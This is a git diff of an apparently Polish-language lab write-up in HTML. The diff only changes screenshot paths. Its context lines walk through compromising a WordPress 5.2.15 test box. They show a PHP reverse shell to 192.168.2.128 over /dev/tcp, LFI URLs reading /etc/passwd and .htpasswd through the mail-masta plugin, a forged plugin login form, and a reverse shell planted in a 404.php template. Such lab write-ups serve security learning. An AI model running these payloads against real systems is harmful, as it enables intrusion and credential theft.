@@ -281,16 +281,16 @@ by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓             
 <span style="color:#f92672">[</span><span style="color:#75715e">####################] - 0s      4613/4613    0s      found:8       errors:0      </span>
 <span style="color:#f92672">[</span><span style="color:#75715e">####################] - 0s      4613/4613    11419/s http://192.168.2.136</span>
 </code></pre></div><h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712024805.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712024805.png" alt=""  />
 
 Po szybkim rozpoznaniu okazało się, że faktycznie mamy <code>Wordpressa 5.2.15</code>.  Jeden ze znanych loginów to <code>admin</code>, ponieważ wskazuje na to poniższy pierwszy post.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712025041.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712025041.png" alt=""  />
 </p>
 <p>Zrobiłem research i odkryłem, że mamy tutaj podatność związaną z <code>xml-rpc.php</code>. Znalazłem też ten pliczek w Feroxbusterze.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712032156.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712032156.png" alt=""  />
 </p>
 <p><a href="https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions">https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions</a></p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020220712032249.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020220712032249.png" alt=""  />
 </p>
 <h1 id="wordpress">Wordpress<a hidden class="anchor" aria-hidden="true" href="#wordpress">#</a></h1>
 <p>Ostatecznie ponownie wykonałem <code>wpscan</code>.</p>
@@ -304,15 +304,15 @@ Po szybkim rozpoznaniu okazało się, że faktycznie mamy <code>Wordpressa 5.2.1
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.2.128/8081 0&gt;&amp;1&#39;&#34;</span>)
 <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712164056.png" alt=""  />
+</span></code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712164056.png" alt=""  />
 
 Nasłuchiwanie na porcie <code>8081</code> oraz uruchomienie linku <code>192.168.2.136/wordpress/wp-content/uploads/2022/07/revshell.php</code> dało połączenie.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712164328.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712164328.png" alt=""  />
 </p>
 <hr>
 <h1 id="www-data">www-data<a hidden class="anchor" aria-hidden="true" href="#www-data">#</a></h1>
 <p>Znalazłem dane w <code>wp-config.php</code> <code>raj:123</code> oraz interesujące pliki obok folderu Wordpressa.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712164623.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712164623.png" alt=""  />
 </p>
 <p><code>notes.txt</code></p>
 <p><code>You Need to ZIP Your Wayout</code></p>
@@ -329,9 +329,9 @@ Nasłuchiwanie na porcie <code>8081</code> oraz uruchomienie linku <code>192.168
 <p>Miałem problemy ze zmianą użytkownika, należało &ldquo;ulepszyć&rdquo; shell
 <code>/usr/bin/script -qc /bin/bash /dev/null</code>.</p>
 <p>Teraz wystarczyło zmienić użytkownika na <code>pwned:pass123</code>. I otrzymałem roota.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712194443.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712194443.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220712194518.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220712194518.png" alt=""  />
 </p>
 <hr>
 <h1 id="inny-sposób-na-wejście">Inny sposób na wejście<a hidden class="anchor" aria-hidden="true" href="#inny-sposób-na-wejście">#</a></h1>
@@ -356,7 +356,7 @@ Nasłuchiwanie na porcie <code>8081</code> oraz uruchomienie linku <code>192.168
 <p>Mail oraz nazwe użytkownika można otrzymać właśnie przez LFI.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">http://192.168.2.136/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd
-</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715225924.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715225924.png" alt=""  />
 
 .
 Teraz możemy wykorzystać problem w pluginie.</p>
@@ -367,22 +367,22 @@ Username: &lt;input type<span style="color:#f92672">=</span><span style="color:#
 &lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;action&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loginGuestFacebook&#34;</span>&gt;
 &lt;input type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> value<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login&#34;</span>&gt;
 &lt;/form&gt;
-</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715230403.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715230403.png" alt=""  />
 
 Klikając login wykorzystujemy lukę w pluginie i jesteśmy zalogowani na użytkowniku <code>aarti</code>.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715230636.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715230636.png" alt=""  />
 </p>
 <p><code>aarti</code> nie ma praw administratora, ale sprawdzając jego profil dokładnie widzimy flagę oraz hasło roota.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715231047.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715231047.png" alt=""  />
 </p>
 <p><code>Second Flag: 5DD1CC591CE1569A528E3BCF18CEEB5B</code></p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715231141.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715231141.png" alt=""  />
 </p>
 <p>Zalogowałem się na admina. Wrzuciłem w template <code>404.php</code> <code>reverse-shell-php</code>.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715231541.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715231541.png" alt=""  />
 
 I w taki sposób uruchamiając stronę <code>http://192.168.2.136/wordpress/wp-content/themes/twentysixteen/404.php</code>, która zawiera w sobie kod php oraz jednocześnie nasłuchując na porcie 9005, otrzymaliśmy shell jako <code>www-data</code>.</p>
-<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220715233253.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220715233253.png" alt=""  />
 </p>
 
 
